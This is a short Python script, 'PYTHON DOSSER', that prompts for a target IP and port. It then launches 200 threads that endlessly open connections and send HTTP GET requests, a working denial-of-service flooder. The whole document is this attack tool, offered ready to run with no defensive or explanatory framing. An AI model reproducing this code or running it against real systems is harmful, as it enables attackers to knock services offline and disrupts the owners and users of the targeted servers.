print("##################################")
print("#          PYTHON DOSSER         #")
print("##################################\n")

import threading
import socket

Target = input("Enter Target IP: ")
Port = int(input("Enter Target Port Number: "))

def Attack():
        while True:
                S = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                S.connect((Target, Port))
                S.send(("GET / HTTP/1.1\r\nHost: " + Target + "\r\n\r\n").encode('ascii'))
                S.close()

for i in range(200):
        thread = threading.Thread(target=Attack, daemon=True)
        thread.start()
